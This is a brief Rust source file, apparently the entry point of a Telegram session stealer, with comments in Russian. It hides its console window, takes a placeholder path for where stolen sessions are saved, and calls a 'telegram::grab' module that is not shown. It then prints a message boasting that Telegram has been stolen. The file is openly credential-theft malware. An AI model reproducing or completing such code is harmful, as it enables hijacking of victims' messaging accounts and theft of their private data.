#![windows_subsystem = "windows"] // Скрываем консоль

mod apps;
mod utils;

fn main() {
    let result_path = String::from("ПУТЬ КУДА СОХРАНЯЕМ СЕССИЮ");

    crate::apps::telegram::grab(result_path.into());

    println!("Телеграм украли и че дальше?");
}
